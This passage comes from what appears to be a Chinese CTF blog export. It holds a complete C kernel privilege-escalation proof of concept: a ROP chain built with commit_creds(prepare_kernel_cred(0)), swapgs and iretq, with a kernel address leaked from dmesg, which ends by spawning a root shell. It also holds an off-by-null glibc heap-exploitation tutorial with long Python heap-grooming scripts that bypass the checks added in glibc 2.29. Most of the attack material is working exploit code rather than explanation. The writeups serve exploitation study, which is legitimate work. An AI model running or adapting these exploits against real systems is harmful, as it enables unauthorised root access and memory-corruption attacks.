memcpy(p,&movRdiRax_call_rdx,8); \n    p+=8;\n\n    //commit_creds_k\n    printf(\"    commit_creds_k at 0x%lx\\n\", commit_creds_k);\n    memcpy(p,&commit_creds_k,8); \n    p+=8;\n\n    /* swapgs;ret           */\n    printf(\"    swapgs       at 0x%lx\\n\", swapgs);\n    memcpy(p,&swapgs,8);\n    p+=8;\n\n    /* iretq                          */\n    printf(\"    iretq        at 0x%lx\\n\", iretq);\n    memcpy(p,&iretq,8);\n    p+=8;\n\n\n    /*\n\tthe stack should look like this after an iretq call\n\t  RIP\n\t  CS\n\t  EFLAGS\n\t  RSP\n\t  SS\n\t*/\n\n\n    /* shell                          */\n    memcpy(p,&sh,8);\n    p+=8;\n\n    /* user_cs                        */\n    memcpy(p,&user_cs,8);\n    p+=8;\n    /* user_rflags                    */\n    memcpy(p,&user_rflags,8);\n    p+=8;\n    /*stack of userspace   \t\t\t  */         \n    register unsigned long rsp asm(\"rsp\");\n    unsigned long sp = (unsigned long)rsp;\n    memcpy(p,&sp,8);\n    p+=8;\n    /* user_ss                        */\n    memcpy(p,&user_ss,8);\n\n    /* trig the vuln                  */\n    printf(\"[+] Trig the vulnerablity...\\n\");\n    write(fd, payload, 300);\n\n\n    return 0;\n\n}\n\n\n\n\n\nunsigned long findAddr() {\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n\n    /* execute dmesg and place result in a file */\n    printf(\"[+] Excecute dmesg...\\n\");\n    system(\"dmesg > /tmp/dmesg\");\n\n    /* find: Freeing SMP alternatives memory    */\n    printf(\"[+] Find usefull addr...\\n\");\n\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n\n\n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n\n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n\n    return addr;\n}\n\nstatic void save_state() {\n    asm(\n        \"movq %%cs, %0\\n\"\n        \"movq %%ss, %1\\n\"\n        \"pushfq\\n\"\n        \"popq %2\\n\"\n        : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"     );\n}\n\nvoid shell(void) {\n    printf(\"[+] getuid() ...\");\n    if(!getuid()) {\n        printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n        system(\"/bin/sh\");\n    } else {\n        printf(\"[+] not root\\n[+] failed !!!\\n\");\n    }\n}\n```\n\n[(15条消息) linux kernel pwn学习之ROP_seaaseesa的博客-CSDN博客](https://blog.csdn.net/seaaseesa/article/details/104575654?ops_request_misc=%7B%22request%5Fid%22%3A%22163298340616780366585344%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=163298340616780366585344&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-104575654.pc_v2_rank_blog_default&utm_term=kernel&spm=1018.2226.3001.4450)\n\n\n\n# 二、Stack未被保护\n\n## 解析\n\n这个直接调用用户空间构造的`commit_creds(prepare_kernel_cred(0))`提权，然后直接原地起shell即可。相当于省去关闭smep保护的那段ROP链，直接getroot即可。\n\n## poc\n\n```c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n\n\nstruct cred;\nstruct task_struct;\ntypedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));\ntypedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));\nprepare_kernel_cred_t   prepare_kernel_cred;\ncommit_creds_t    commit_creds;\n\nunsigned long user_cs;\nunsigned long user_ss;\nunsigned long user_rflags;\nunsigned long stack;\n\n\nunsigned long findAddr();\nstatic void save_state();\nvoid getroot (void);\nvoid shell(void);\n\n\nint main(int argc, char *argv[])\n{\n    int fd;\n    unsigned char payload[300] = {0};\n    unsigned char *p           = payload;\n    unsigned long memOffset;\n\n\n\n    memOffset = findAddr();\n    unsigned long pop_rax_rbx_r12_rbp_ret = memOffset - 0xCB5B47;\n    unsigned long movCr4Rax_pop_rbp = (unsigned long)memOffset-0x01020F1C;\n    unsigned long getR = (unsigned long)getroot;\n    unsigned long swapgs = (unsigned long)memOffset-0x7AAE78;\n    unsigned long iretq = (unsigned long)memOffset-0x7AC289;\n    unsigned long sh = (unsigned long)shell;\n\n\n\n\n    printf(\"    addr[0x%llx]\\n\", memOffset);\n\n    /* set value for commit_creds and prepare_kernel_cred */\n    commit_creds        = (commit_creds_t)(memOffset - 0xfbf6a0);\n    prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xfbf2e0);\n\n\n    /* open fd on /dev/vuln \t\t\t\t\t\t\t*/\n    printf(\"[+] Open vuln device...\\n\");\n    if ((fd = open(\"/dev/stack\", O_RDWR)) < 0) {\n        printf(\"    Can't open device file: /dev/stack\\n\");\n        exit(1);\n    }\n\n\n    /* payload                          */\n    printf(\"[+] Construct the payload...\\n\");\n    save_state();\n    /* offset before RIP                    */\n    memcpy(p,\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",116);\n    p+=116;\n\n    memcpy(p,\"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\",8);   /* for rbp */\n    p+=8;\n\n\n    /* getroot                        */\n    memcpy(p,&getR,8);\n    p+=8;\n\n    /* swapgs;ret           */\n    printf(\"    swapgs       at 0x%lx\\n\", swapgs);\n    memcpy(p,&swapgs,8);\n    p+=8;\n\n    /* iretq                          */\n    printf(\"    iretq        at 0x%lx\\n\", iretq);\n    memcpy(p,&iretq,8);\n    p+=8;\n\n\n    /*\n\tthe stack should look like this after an iretq call\n\t  RIP\n\t  CS\n\t  EFLAGS\n\t  RSP\n\t  SS\n\t*/\n\n\n    /* shell                          */\n    memcpy(p,&sh,8);\n    p+=8;\n\n\n\n    /* user_cs                        */\n    memcpy(p,&user_cs,8);\n    p+=8;\n    /* user_rflags                    */\n    memcpy(p,&user_rflags,8);\n    p+=8;\n    /*stack of userspace   \t\t\t  */         \n    register unsigned long rsp asm(\"rsp\");\n    unsigned long sp = (unsigned long)rsp;\n    memcpy(p,&sp,8);\n    p+=8;\n    /* user_ss                        */\n    memcpy(p,&user_ss,8);\n\n    /* trig the vuln                  */\n    printf(\"[+] Trig the vulnerablity...\\n\");\n    write(fd, payload, 300);\n\n\n    return 0;\n\n}\n\n\n\n\n\nunsigned long findAddr() {\n    char line[512];\n    char string[] = \"Freeing SMP alternatives memory\";\n    char found[17];\n    unsigned long addr=0;\n\n    /* execute dmesg and place result in a file */\n    printf(\"[+] Excecute dmesg...\\n\");\n    system(\"dmesg > /tmp/dmesg\");\n\n    /* find: Freeing SMP alternatives memory    */\n    printf(\"[+] Find usefull addr...\\n\");\n\n    FILE* file = fopen(\"/tmp/dmesg\", \"r\");\n\n\n    while (fgets(line, sizeof(line), file)) {\n        if(strstr(line,string)) {\n            strncpy(found,line+53,16);\n            sscanf(found,\"%p\",(void **)&addr);\n            break;\n        }\n    }\n    fclose(file);\n\n    if(addr==0) {\n        printf(\"    dmesg error...\\n\");\n        exit(1);\n    }\n\n    return addr;\n}\n\nstatic void save_state() {\n    asm(\n        \"movq %%cs, %0\\n\"\n        \"movq %%ss, %1\\n\"\n        \"pushfq\\n\"\n        \"popq %2\\n\"\n        : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"     );\n}\n\nvoid shell(void) {\n    printf(\"[+] getuid() ...\");\n    if(!getuid()) {\n        printf(\" [root]\\n[+] Enjoy your shell...\\n\");\n        system(\"/bin/sh\");\n    } else {\n        printf(\"[+] not root\\n[+] failed !!!\\n\");\n    }\n}\n\n/* function to get root id */\nvoid getroot (void)\n{\n    commit_creds(prepare_kernel_cred(0));\n}\n\n\n\n\n```\n\n▲这里如果加了SMEP保护，那么就会出现下列的错误\n\n```\nunable to execute userspace code (SMEP?) (uid: 1000)\n```\n\n![image-20211004100138854](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211004100145.png)\n\n","tags":["pwnKernel"],"categories":["pwnKernel"]},{"title":"off-by-null总结","url":"/2021/08/31/off-by-null总结/","content":"\n\n\n# 前言\n\noff-by-null是堆中的常见漏洞，很多时候都是结合堆布局来进行利用的。这里结合原理解析、不同版本和条件的off-by-null以及常见的漏洞条件做个总结。\n\n# 一、原理解析\n\n主要发生在`_int_free`的unlink中：\n\n```c\n//2.23 when size>global_max_fast\n\n/* consolidate backward */\nif (!prev_inuse(p)) {\n    prevsize = p->prev_size;\n    size += prevsize;\n    p = chunk_at_offset(p, -((long) prevsize));\n    unlink(av, p, bck, fwd);\n}\n\n\nif (nextchunk != av->top) {\n    /* get and clear inuse bit */\n    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n\n    /* consolidate forward */\n    if (!nextinuse) {\n        unlink(av, nextchunk, bck, fwd);\n        size += nextsize;\n    }\n    \n\n    \n/* Take a chunk off a bin list */\n#define unlink(AV, P, BK, FD) {                                             \n    FD = P->fd;\t\t\t\t\t\t\t\t       \n    BK = P->bk;\t\t\t\t\t\t\t\t       \n    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))\t\t       \n        malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);   \n    else {\t\t\t\t\t\t\t\t       \n        FD->bk = BK;\t\t\t\t\t\t\t       \n        BK->fd = FD;\t\t\t\t\t\t\t       \n        if (!in_smallbin_range (P->size)\t\t\t\t       \n            && __builtin_expect (P->fd_nextsize != NULL, 0)) \n        {\t\t       \n            if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)\t       \n                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))     \n                malloc_printerr (check_action,\t\t\t\t       \n                                 \"corrupted double-linked list (not small)\",     \n                                 P, AV);\t\t\t\t\t       \n            if (FD->fd_nextsize == NULL) {\t\t\t\t       \n                if (P->fd_nextsize == P)\t\t\t\t       \n                    FD->fd_nextsize = FD->bk_nextsize = FD;\t\t       \n                else {\t\t\t\t\t\t\t       \n                    FD->fd_nextsize = P->fd_nextsize;\t\t\t       \n                    FD->bk_nextsize = P->bk_nextsize;\t\t\t       \n                    P->fd_nextsize->bk_nextsize = FD;\t\t\t       \n                    P->bk_nextsize->fd_nextsize = FD;\t\t\t       \n                }\t\t\t\t\t\t\t       \n            } else {\t\t\t\t\t\t\t       \n                P->fd_nextsize->bk_nextsize = P->bk_nextsize;\t\t       \n                P->bk_nextsize->fd_nextsize = P->fd_nextsize;\t\t       \n            }\t\t\t\t\t\t\t\t       \n        }\t\t\t\t\t\t\t\t       \n    }\n}    \n```\n\n为了方便，依据物理地址相邻来命名如下：\n\n![Snipaste_2021-08-31_11-47-47](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831114803.png)\n\n即当size大于global_max_fast且不是mmap出来的chunk时，就会进入判断。所以这里我们进行释放用的chunk的大小就必须要大于global_max_fast才行，否则就是改掉了pre_inuse位也是直接进入fastbin，不会进入判断的。\n\n+ 先依据当前chunk(chunkP)的pre_inuse位来判断前一个chunk(preChunk)是否处于释放状态，是则进入unlink，将前一个chunk取出\n\n+ 然后判断下一个chunk(nextChunk)是否是top_chunk，是则直接与top_chunk合并。\n+ 若nextChunk不为top_chunk，再判断下一个Chunk的再下一个chunk的pre_inuse位来判断nextChunk是否处于释放状态，若是则进入unlink。\n\n然后unlink中就不细说，就是双向循环链表解链的过程，依据fd和bk来查找并解链，但是我们的off-by-null通常不会涉及到nextsize位的使用，所以基本不用看后面的。需要注意的是，由于这里会检查，即：\n\n    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))\t\t       \n        malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n\n所以我们需要将进入unlink的chunk的fd和bk来进行伪造或者干脆直接释放使其直接进入unsortedbin中完成双向链表的加持。这里先讲放入unsortedbin中来获取fd和bk的方法，伪造的方法一般用在2.29及以上的高版本中，因为那时候的unlink加入了关于size位的检查，不能简单得伪造fd和bk。\n\n其次，这里还需要明白一个寻找chunk的原理。\n\n+ 寻找preChunk：preChunk_addr = chunkP_addr - chunkP->pre_size\n+ 寻找nextChunk：nextChunk_addr = chunkP_addr + chunkP->size\n\n即以下源码，这个一直没有变化过：\n\n```c\n/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */\n#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))\n\n/* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))\n\n/* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))\n\n/* extract p's inuse bit */\n#define inuse(p)\t\t\t\t\t\t\t      \\\n  ((((mchunkptr) (((char *) (p)) + chunksize (p)))->mchunk_size) & PREV_INUSE)\n```\n\n所以，如果我们可以伪造pre_size和in_use位，就能触发向上任意寻找一个满足fd和bk为双向链表的chunk，从而将中间所有的chunk都一并合并为一个Chunk释放掉。(向下合并也可以的，不过一般不常使用)\n\n![Snipaste_2021-08-31_11-57-00](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831115708.png)\n\n这里就是通过释放chunkP，依据pre_size向上寻找到原本已经在unsortedbin中的preChunk，其FD和BK已经组成双向循环链表，可以绕过检查，所以释放ChunkP之后preChunk+OverlapChunk+chunkP都进入到unsortedbin中。但是OverlapChunk本身其实并没有被释放，我们再从unsortedbin中申请切割出preChunk大小的chunk，再申请就可以得到OverlapChunk。这样我们就有两个指针都指向OverlapChunk，从而伪造出UAF，之后我们就可以通过OverlapChunk来getshell了。\n\n## 1.常用布局\n\n```python\nadd_malloc(0xf8,'\\x00'*0xf8)\t#0x1\nadd_malloc(0x68,'\\x00'*0x68)\t#0x2\nadd_malloc(0xf8,'\\x00'*0xf8)\t#0x3\nadd_malloc(0x68,'\\x00'*0x68)\t#0x4\nfree(0x1)\nedit(0x2,0x70,'\\x00'*0x60+p64(0x70+0x100)+p16(0x100))\nfree(0x3)\n```\n\noff-by-null在调试中不太好搞，所以我就借用堆溢出来假设存在off-by-null，将chunk3原本的size位0x101通过off-by-null变成0x100即可。\n\n\n\n## 2.注意事项\n\n### (1)顺序\n\n此外需要注意的是，需要先释放chunk1，再溢出修改chunk3。不然如果先修改chunk3，那么释放chunk1的时候，寻找chunk1的nextChunk即chunk2，判断chunk2是否处于释放状态时，会找到chunk3，依据pre_inuse位发现chunk2已经处于释放状态，那么尝试进入unlink合并，但是这里的chunk2的fd和bk并没有组成双向循环链表，所以会出错。\n\n### (2)size位的设置\n\n+ 0x100：这里注意到上面的布局中size位为0x100和0x70，这里的0x100就是为了通过off-by-null将0x101变成0x100设置的。当然设置为0x201，0x301通常也是一样的。\n\n+ 0x70：这里就通常是为了方便打fastbin attack，从_malloc_hook处构造0x7f字节错位用的。\n\n\n\n# 二、更新换代\n\n## 1.Glibc2.27\n\n这里也不是特指2.27，而指的是Glibc2.29以下的存在tcache的版本，这类版本通常需要填充满tcache再进行释放，也不需要多讲。\n\n## 2.Glibc2.29\n\n从这个版本开始，off-by-null由于加入的检查，引入了好几种全新的利用方式。\n\n### (1)_int_free中的变化\n\n```c\nif (!prev_inuse(p)) {\n    prevsize = prev_size (p);\n    size += prevsize;\n    p = chunk_at_offset(p, -((long) prevsize));\n    if (__glibc_unlikely (chunksize(p) != prevsize))\n        malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n    unlink_chunk (av, p);\n}\n```\n\n加入的检查是\n\n```c\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\n这里的p因为`p = chunk_at_offset(p, -((long) prevsize));`已经变成了preChunk。所以这里就是检查preChunk->size是否等于chunkP->pre_size。按照上面那张图的逻辑，preChunk的size为0x101，chunkP的pre_size为0x170，两个不等于，根本就无法进入unlink中，直接崩掉。\n\n![Snipaste_2021-08-31_11-57-00](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831123554.png)\n\n### (2)unlink变化\n\n首先unlink从宏定义变成了全局函数定义，名字也从unlink变成了unlink_chunk，但实际内容没有变太多，只是加入了一些检查：\n\n```c\n/* Take a chunk off a bin list.  */\nstatic void\n    unlink_chunk (mstate av, mchunkptr p)\n{\n    if (chunksize (p) != prev_size (next_chunk (p)))\n        malloc_printerr (\"corrupted size vs. prev_size\");\n\n    mchunkptr fd = p->fd;\n    mchunkptr bk = p->bk;\n\n    if (__builtin_expect (fd->bk != p || bk->fd != p, 0))\n        malloc_printerr (\"corrupted double-linked list\");\n\n    fd->bk = bk;\n    bk->fd = fd;\n    if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)\n    {\n        if (p->fd_nextsize->bk_nextsize != p\n            || p->bk_nextsize->fd_nextsize != p)\n            malloc_printerr (\"corrupted double-linked list (not small)\");\n\n        if (fd->fd_nextsize == NULL)\n        {\n            if (p->fd_nextsize == p)\n                fd->fd_nextsize = fd->bk_nextsize = fd;\n            else\n            {\n                fd->fd_nextsize = p->fd_nextsize;\n                fd->bk_nextsize = p->bk_nextsize;\n                p->fd_nextsize->bk_nextsize = fd;\n                p->bk_nextsize->fd_nextsize = fd;\n            }\n        }\n        else\n        {\n            p->fd_nextsize->bk_nextsize = p->bk_nextsize;\n            p->bk_nextsize->fd_nextsize = p->fd_nextsize;\n        }\n    }\n\n}\n```\n\n加入的检查，就加了一个if语句：\n\n```c\n  if (chunksize (p) != prev_size (next_chunk (p)))\n    malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\n即在unlink时会检查nextChunk的pre_size是否等于chunkP的size。\n\n按照之前那张图的逻辑，进入unlink中时preChunk的size为0x100，preChunk的nextChunk，即overlapChunk的pre_size为0x100，相等，可以满足要求，没啥大用，但是之后提出的绕过手段也是需要绕过这个检查的。\n\n![Snipaste_2021-08-31_11-57-00](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831122206.png)\n\n▲后面的更高版本，到2.33都没变化，也就不提了。只是2.32中的指针异或可能需要注意一下，但是之后的绕过手段一般是基于unsortedbin，smallbin，largebin来绕过，不存在指针异或的情况，所以也不用太在意。\n\n# 三、高版本花式绕过\n\n这里将的是2.29及以上的版本\n\n## 第一种\n\n这个之前写过，参考这篇文章：\n\n[2.29下的off-by-null | PIG-007](https://www.pig-007.top/2021/08/14/2.29下的off-by-null/)\n\n或者t1an5g师傅的文章：\n\nhttps://bbs.pediy.com/thread-257901.htm#msg_header_h2_2\n\n当然ex师傅的原始解析也很好：\n\nhttp://blog.eonew.cn/archives/1233\n\n但是这个需要爆破半个字节，也不能对size做太多的限制，且chunk需要申请大概有24个，所以看个人需要。\n\n## 第二种\n\n这个也写过，参考这篇：\n\n[2.29-2.32下的off-by-null | PIG-007](https://www.pig-007.top/2021/08/14/2.29-2.32下的off-by-null/)\n\n当然我也是参考WJH师傅的：\n\n[glibc 2.29-2.32 off by null bypass - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/236078)\n\n这个不需要爆破，但是对size的限制不能太严格，需要largebin的size。\n\n## 第三种\n\n这个还没写过总结，现在来，不过先贴下文章，init-0师傅的：\n\n[堆漏洞利用（2.29以上glibc,off-by-null, 加了申请size限制） - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/231418#h3-8)\n\n这种方法在size限制下也可以使用，文章中的限制是0xe8的堆块，真是将堆布局用到极高的水平。\n\n▲先看最终的布局效果：\n\n![Snipaste_2021-08-31_18-42-42](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831184255.png)\n\n这样就能通过两项检查了：\n\n```c\n//_int_free中\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n\n//unlink中\nif (chunksize (p) != prev_size (next_chunk (p)))\n    malloc_printerr (\"corrupted size vs. prev_size\");\n```\n\n\n\n### (1)前置布局：\n\n由于init-0师傅的题目中，申请chunk是从0x3a0开始的，所以这里我就也以0x3a0开始：\n\n```python\n#get layout to let chunk0_addr = 0x****3a0\nclaim(0x88)# 0-6\t\t\t#1-7\nclaim(0x98)# 7-13\t\t\t#8-14\nclaim(0xa8)# 14-20\t\t\t#15-21\nclaim(0xb8)# 21-27\t\t\t#22-28\nclaim(0xc8)# 28-34\t\t\t#29-35\nclaim(0xd8)# 35-41\t\t\t#36-42\nclaim(0xe8)# 42-48\t\t\t#43-49\n\n#--------------------------\nadd_malloc(0x98,'\\x00')# 49 \t\t\t\t#50\nadd_malloc(0x98,'\\x00')# 50 \t\t\t\t#51\t\t0x****f900\nadd_malloc(0x18,'\\x00')# 51  \t\t\t\t#52 \t0x****f9a0\nadd_malloc(0xa8,'\\x00')# 52     0 \t\t\t#53\t\t0x****f9c0\nadd_malloc(0xb8,'\\x00')# 53     1 \t\t\t#54\t\t0x****fa70\nadd_malloc(0xd8,'\\x00')# 54     2 \t\t\t#55\t\t0x****fb30\nadd_malloc(0xd8,'\\x00')# 55     \t\t\t#56\t\t\nadd_malloc(0xe8,'\\x00')# 56     3 \t\t\t#57\t\t0x****fcf0\n\n#这个0x200和0xe0的设置是为了之后将unsortedbinChunk给改成0x200备用的\nfakeChunk_nextChunk_preSize = p64(0x200) + p64(0xe0)\nedit(57,0x10,fakeChunk_nextChunk_preSize)# 56\t\t\t#57\n\nadd_malloc(0xe8,'\\x00')# 57    4 \t\t\t#58 \t0x****fde0\nadd_malloc(0x98,'\\x00')# 58 \t\t\t\t#59\nadd_malloc(0xe8,'\\x00')# 59 \t\t\t\t#60 \t0x****ff70\nadd_malloc(0x18,'\\x00')# 60 \t\t\t\t#61\n```\n\n### (2)填充tcache\n\n并且将要利用的Chunk释放合并进入unsortedbin\n\n```python\n#free 0~48 \t\t#1~49\n#-------------------------\n#--tcache\nfor i in range(0,7):  #0x88  \t\n    free(i+1)\nfor i in range(14,21):#0xa8\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\nfor i in range(35,42):#0xd8\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)    \n#--tcache\n\nfor i in range(52,57): #52~56  \t\t\t\t#53~57  merge into unsortedbin\n    free(i+1)\n```\n\n![Snipaste_2021-08-31_19-41-25](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831194137.png)\n\n```mermaid\ngraph TD;\n    0(chunk53<br>0xa8<br>0x****9c0)-->1(chunk54<br>0xb8)-->2(chunk55<br>0xd8)-->3(chunk56<br>0xd8)-->4(chunk57<br>0xe8<br>0x****cf0)\n```\n\n### (3)重构53~57结构为97~101\n\n```python\n#---------------------------\n# empty tcache\nclaim(0x88) #62~68\nclaim(0xa8) #69~75\nclaim(0xb8) #76~82\nclaim(0xd8) #83~89\nclaim(0xe8) #90~96\n#---------------------------\n\n#---------------------------------------------------------------- 上面是一个大的unsorted bin\n#进行add之后carver up and unsortedbin 被放入了largebin 之后进行了分配\nadd_malloc(0x98,'\\x00')# 52 \t#97  \t#0x****9c0\nadd_malloc(0x98,'\\x00')# 53     #98\t\t#0x****A60\n\nfake_chunk_size = 0x98 * \"a\" + p16(0x200)\n#这里我借用堆溢出来仿照off-by-null，修改还在largebin中的chunk的size从0x2e1->0x200\n#changing largebinChunk_size will not cause abort\nedit(98,0x98+0x2,fake_chunk_size)#53 #98\nadd_malloc(0x88,'\\x00')#54 \t#99 \t#0x****B00\nadd_malloc(0x88,'\\x00')#55  #100 \t#0x****B90\nadd_malloc(0xd8,'\\x00')#56  #101 \t#0x****C70\n```\n\n重构之后如下\n\n```mermaid\ngraph TD;\n    0(chunk97<br>0x98<br>0x****9c0)-->1(chunk98<br>0x98)-->2(chunk99<br>0x88)-->3(chunk100<br>0x88)-->4(chunk101<br>0xd8<br>0x****cf0)-->5(0xe0碎片)\n```\n\n那么实际上其实原先的0x420被申请了0x340，还有一部分0xe0没有被申请出来。\n\n![Snipaste_2021-08-31_20-07-33](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831200742.png)\n\n### (4)构造preChunk的fd和bk\n\n```python\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(0,7):#0x88\n    free(i+1)\nfor i in range(42,49):#0xe8\n    free(i+1)        \n#------tcache\n\n\nfree(51)#0x98 \t#50  \t#51 #0x****f900\n#let 99->fd = chunk51_addr(0x****f900)\nfree(99)#0x88  \t#54 \t#99\n#let 99->bk = chunk60_addr(0x****ff70)\nfree(60)#0xe8 \t#59 \t#60 #0x****ff70\n```\n\n\n\n![Snipaste_2021-08-31_20-40-24](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210831204034.png)\n\n### (5)再重构97~101为97->124->132->134\n\n```python\nfree(98)#0x98 \t#53 \t#98\n\n#---------------add back\nclaim(0x88) #102~108\nclaim(0x98) #109~115\nclaim(0xe8) #116~122\n#---------------add back\n\n#将51,99,98分别放入对应的smallbin,98和99由于物理相邻，所以合并成为0x130的块\n#之后依据大小适配原则将60分配回来给123\nadd_malloc(0xd8,'\\x00')# 0x32\t\t#123 0x****ff70,实际大小为0xf0\n#将0x131的smallbin切分，此时51还在0xa0的smallbin中，剩下0x70的Chunk进入unsortedbin中\nadd_malloc(0xb8,'\\x00')# 0x35  \t\t#124 0x****fa60\n\nfor i in range(0,7):#0x88\n    free(i+1)\n#chunk100放入unsortedbin, 与0x70的碎片合并，形成0x101的块\nfree(100) \t\t\t#55 \t#100\n\nclaim(0x88)\t#125~131\n\n#切割0x101的块，获得0xb8大小的0x****fb20，方便与0x****f900的块放入同一个unsortebin中\nadd_malloc(0xb8,'\\x00')#0x36 \t#132 \t0x****fb20\nadd_malloc(0x98,'\\x00')#0x37  \t#133\t0x****f900\nadd_malloc(0x38,'\\x00')#0x3b \t#134 \t0x****fbe0\n```\n\n重构之后如下\n\n```mermaid\ngraph TD;\n    0(chunk97<br>0x98<br>0x****f9c0)-->1(chunk124<br>0xb8<br>chunk99被包含<br>0x****fa60)-->2(chunk132<br>0xb8<br>0x****fb20)-->3(chunk134<br>0x38<br>0x****fbe0)-->4(0xe0碎片)\n```\n\n### (6)修复FD->bk和BK->fd\n\n```python\n#------tcache\nfor i in range(42,49):#0xe8\n    free(i+1)        \nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n#let 133->bk = chunk132_addr(0x****f900->bk = 0x****fb20)\nfree(133) #0x37 \t#133 \t0x****f900\nfree(132) #0x36  \t#132 \t0x****fb20\n#let 123->fd = chunk132_addr(0x****ff70->bk = 0x****fb20)\nfree(123) #0x32 \t#123  \t0x****ff70\n```\n\n### (7)再重构为97->124->157->134 \n\n方便将`0x****ff70`和`0x****f900`的对于fd,bk进行off-by-null，使得0xb20变为0xb00。\n\n```python\nfree(59)  #58\t\t#59\t\t0x****fed0\n#chunk59和chunk123合并进入unsortedbin，大小0x190(0xf0+0xa0)\n\nclaim(0x98) \t#135~141\nclaim(0xb8)\t\t#142~148\nclaim(0xe8) \t#149~155\n\nadd_malloc(0xc8,'\\x00')\t\t#0x32 \t\t#156 \t0x****fed0\t\nadd_malloc(0xb8,'\\x00')\t\t#0x36 \t\t#157 \t0x****fb20\nadd_malloc(0xb8,'\\x00')\t\t#0x37  \t\t#158\t0x****ffa0\nadd_malloc(0x98,'\\x00')\t\t#58  \t\t#159 \t0x****f900\n\n#--top_chunk\nadd_malloc(0x98,'\\x00')        #0x3d \t\t\t#160\nadd_malloc(0x98,'\\x00')        #0x3e \t\t\t#161\nadd_malloc(0x18,'\\x00')        #0x3f \t\t\t#162\n\n#------tcache\nfor i in range(7,14):#0x98\n    free(i+1)\nfor i in range(21,28):#0xb8\n    free(i+1)\n#------tcache\n\n\nfree(161) #0x98 \t#0x3e \t\t#161\nfree(159) #0x98 \t#58  \t\t#159 \t0x****f900\nfree(157) #0xb8 \t#0x36 \t\t#157\nfree(50)  #0x98 \t#49 \t\t#50 \t0x****f860\n#其中159和50合并为0x140大小的块放入unsortedbin中\n#unsortedbin:0x****f860 —▸ 0x****fb20 —▸ 0x****0120\n\nclaim(0xb8) #163~169\nclaim(0x98) #170~176\n#----------------------------------------------------\nadd_malloc(0xb8,'\\x00') #49 \t#177\nadd_malloc(0x98,'\\x00') #0x36  \t#178\n\n#切割0x140的块\nadd_malloc(0xc8,'\\x00')#0x3a \t#179 \t0x****f860\nadd_malloc(0x68,'\\x00')#0x3e   \t#180 \t\n```\n\n现在就可以通过chunk179来将`0x****f900`中的bk给改掉。\n\n通过chunk156来将`0x****ff70`中的fd给改掉。\n\n### (8)利用off-by-null得到最终布局\n\n```python\npartial_null_write = 0x98*'b'\npartial_null_write += p64(0xf1)\nedit(156,0x98+0x8+0x1,partial_null_write+'\\x00') #0x32  \t#156\n\npartial_null_write = 0xa8*'c'\nedit(179,0xa8+0x1,partial_null_write + '\\x00') \t\t#0x3a \t\t#179\n\n#伪造pre_size\nfake_chunk_size = 0x98*'d'\nfake_chunk_size += p64(0x2e1)\nedit(124,0x98+0x8,fake_chunk_size) \t#0x35 \t#124\n```\n\n### (9)触发off-by-null\n\n```python\nfor i in range(42,49):#0xe8\n    free(i+1)    \nfree(58)\n```\n\n### 